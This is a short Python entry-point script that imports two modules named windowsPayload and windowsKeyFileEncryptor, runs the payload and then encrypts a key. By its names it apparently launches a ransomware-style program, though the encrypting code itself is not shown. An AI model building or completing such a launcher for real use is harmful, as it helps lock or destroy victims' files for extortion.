import windowsPayload, windowsKeyFileEncryptor


def main():
	windowsPayload.main()
	windowsKeyFileEncryptor.encryptKey()

if __name__ == '__main__':
 	main()